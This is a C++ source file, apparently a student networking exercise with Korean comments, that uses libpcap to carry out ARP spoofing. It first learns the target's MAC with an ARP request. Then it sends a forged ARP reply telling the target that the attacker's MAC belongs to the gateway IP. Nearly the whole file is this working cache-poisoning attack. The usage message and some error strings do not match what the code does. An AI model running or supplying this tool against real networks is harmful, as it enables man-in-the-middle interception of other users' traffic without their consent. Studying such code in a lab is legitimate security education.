#include <cstring>
#include <unistd.h>
#include <net/if.h>  
#include <ctime>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
   printf("syntax: send-arp-test <interface>\n");
   printf("sample: send-arp-test wlan0\n");
}

bool get_my_mac(const char* iface, Mac& mac) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;

    struct ifreq ifr;

    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }

    mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
    close(sock);
    return true;
}


bool get_my_ip(const char* iface, Ip& ip) {
   int sock = socket(AF_INET, SOCK_DGRAM, 0);
   if (sock < 0) return false;

   struct ifreq ifr;
   strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
   ifr.ifr_name[IFNAMSIZ - 1] = '\0';

   if (ioctl(sock, SIOCGIFADDR, &ifr) != 0) {
      close(sock);
      return false;
   }

   ip = Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
   close(sock);
   return true;
}

void arp_request(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        printf("Failed to receive ARP requset\n");
    } else {
        printf("ARP request sent to %s\n", string(target_ip).c_str());
    }
}

bool arp_reply(pcap_t* pcap, Ip target_ip, Mac& target_mac) {
    time_t start = time(nullptr);
    while (time(nullptr) - start < 5) {
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;

        if (res < 0) {
            printf("pcap_next_ex error\n");
            break;
        }

        //arp 유무 확인
        EthHdr* eth_hdr = (EthHdr*)packet;
        if (ntohs(eth_hdr->type_) != EthHdr::Arp) continue;

        const EthArpPacket* arp_packet = reinterpret_cast<const EthArpPacket*>(packet);

        if (ntohs(arp_packet->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(arp_packet->arp_.sip_) != Ip(target_ip)) continue;

        // 🎯 타겟 MAC 주소 저장
        target_mac = arp_packet->arp_.smac_;
        return true;
    }
    printf("Failed to receive ARP reply\n");
    return false;
}



void arp_spoof(pcap_t* pcap, Mac my_mac, Ip gateway_ip, Mac target_mac, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = target_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;              // 내가 게이트웨이가 된다.
    packet.arp_.sip_ = htonl(gateway_ip);    // 게이트웨이 IP
    packet.arp_.tmac_ = target_mac;
    packet.arp_.tip_ = htonl(target_ip);     

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        printf("Failed to ARP spoof\n");
    } else {
        printf("Sent ARP spoof to %s (pretending to be gateway %s)\n", string(target_ip).c_str(), string(gateway_ip).c_str());
    }

}


int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    Ip target_ip = Ip(argv[2]);
    Ip gateway_ip = Ip(argv[3]);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}


    Mac my_mac;
    Ip my_ip;

    if (!get_my_mac(dev, my_mac)) {
        fprintf(stderr, "failed to get my Mac\n");
        return EXIT_FAILURE;
    }

    if ( !get_my_ip(dev, my_ip)) {
        fprintf(stderr, "failed to get my IP\n");
        return EXIT_FAILURE;
    }

    printf("My MAC: %s\n", string(my_mac).c_str());
    printf("My IP : %s\n", string(my_ip).c_str());

    arp_request(pcap, my_mac, my_ip, target_ip);

    //target_mac 구하기
    Mac target_mac;
    if ( !arp_reply(pcap, target_ip, target_mac)) {
        printf("failed to get Target Mac\n");
        return EXIT_FAILURE;
    }

    printf("Target MAC: %s\n", string(target_mac).c_str());

    arp_spoof(pcap, my_mac, gateway_ip, target_mac, target_ip);

    pcap_close(pcap);
    return 0;
}

